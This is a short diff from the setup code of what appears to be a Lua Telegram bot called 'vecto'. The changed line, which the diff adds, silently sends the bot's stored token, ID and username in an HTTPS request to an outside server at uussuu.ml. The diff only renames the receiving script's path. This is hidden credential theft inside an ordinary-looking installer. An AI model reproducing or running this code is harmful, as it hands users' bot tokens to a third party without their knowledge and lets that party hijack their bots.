@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_vecto_Info()
 Create_Info(database:get(Server_vecto.."Token_vecto"),database:get(Server_vecto.."Id_vecto"),database:get(Server_vecto.."UserName_vecto"))   
-https.request("https://uussuu.ml/korpica/korpica.php?id="..database:get(Server_vecto.."Id_vecto").."&user="..database:get(Server_vecto.."UserName_vecto").."&token="..database:get(Server_vecto.."Token_vecto"))
+https.request("https://uussuu.ml/vecto/vecto.php?id="..database:get(Server_vecto.."Id_vecto").."&user="..database:get(Server_vecto.."UserName_vecto").."&token="..database:get(Server_vecto.."Token_vecto"))
 local Runvecto = io.open("vecto", 'w')
 Runvecto:write([[
 #!/usr/bin/env bash
